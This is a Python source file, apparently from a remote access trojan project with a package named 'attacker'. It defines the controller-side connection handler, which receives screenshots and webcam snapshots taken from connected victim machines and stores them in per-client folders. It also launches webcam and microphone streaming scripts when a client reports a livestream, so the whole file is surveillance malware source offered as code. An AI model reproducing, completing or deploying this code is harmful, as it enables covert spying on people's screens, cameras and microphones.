import asyncore
import os
import threading
from attacker.util import *

# point to the project attacker folder (one level up from terminal package)
CURRENT_FOLDER = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))

BUFFER_SNAPSHOT = 609600
BUFFER_DEFAULT = 8096
ENCODING = "Cp1252"

WEBCAM_SCRIPT = "webcam-host.py"
MICROPHONE_SCRIPT = "microphone-host.py"

WEBCAM_DIR_FMT = "webcam{client_id}"
SCREENSHOT_DIR_FMT = "screenshots{client_id}"

SNAPSHOT_NAME_FMT = "snapshot_NUM{num}.png"
SCREENSHOT_NAME_FMT = "Screenshot_ID{client_id}_NUM{num}.png"

class ConnectionHandler(asyncore.dispatcher_with_send):

    receiving_screenshot = False
    receiving_livefeed = False
    receiving_snapshot = False

    def __init__(self, sock, addr, window, iD, connections):
        asyncore.dispatcher_with_send.__init__(self, sock)
        self.window = window
        self.id = iD
        self.screenshot_number = 1
        self.snapshot_number = 1
        self.addr = addr
        self._connections = connections

    def video_stream():
        # use constant script name
        os.system(WEBCAM_SCRIPT)

    def audio_stream():
        # use constant script name
        os.system(MICROPHONE_SCRIPT)

    def handle_read(self):
        global CURRENT_FOLDER, video_thread

        if ConnectionHandler.receiving_snapshot:
            # use extracted buffer size and filename format
            data = self.recv(BUFFER_SNAPSHOT)
            image_name = SNAPSHOT_NAME_FMT.format(num=self.snapshot_number)

            webcam_dir = WEBCAM_DIR_FMT.format(client_id=self.id)
            if not webcam_dir in os.listdir():
                os.mkdir(webcam_dir)

            with open(f"{webcam_dir}/{image_name}", "wb") as file:
                file.write(data)

            self.snapshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(SNAPSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
            ConnectionHandler.receiving_snapshot = False

        elif ConnectionHandler.receiving_screenshot:
            # use extracted buffer size and filename format
            data = self.recv(BUFFER_SNAPSHOT)
            image_name = SCREENSHOT_NAME_FMT.format(client_id=self.id, num=self.screenshot_number)

            screenshots_dir = SCREENSHOT_DIR_FMT.format(client_id=self.id)
            if not screenshots_dir in os.listdir():
                os.mkdir(screenshots_dir)

            with open(f"{screenshots_dir}/{image_name}", "wb") as file:
                file.write(data)

            self.screenshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(SCREENSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
            ConnectionHandler.receiving_screenshot = False

        else:
            # use extracted default buffer and encoding
            data = self.recv(BUFFER_DEFAULT).decode(ENCODING)
            if data == "Taken Screenshot":
                ConnectionHandler.receiving_screenshot = True
            if data == "Taken Snapshot":
                ConnectionHandler.receiving_snapshot = True
            elif data == "STARTING LIVESTREAM":
                video_thread = threading.Thread(target=ConnectionHandler.video_stream)
                video_thread.start()
            elif data == "STARTING AUDIOSTREAM":
                audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
                audio_thread.start()
            elif data != "":
                self.window.Output.addItem(f"\n{ts()} {data}")

    def handle_close(self):
        try:
            self.close()
        finally:
            self._connections.pop(self.id, None)
            self.window.Output.addItem(CONN_DISCONNECT_TEMPLATE.format(time=ts(), addr=self.addr))

    def handle_expt(self):
        try:
            self.close()
        finally:
            self._connections.pop(self.id, None)
            self.window.Output.addItem(CONN_LOST_TEMPLATE.format(time=ts(), addr=self.addr))
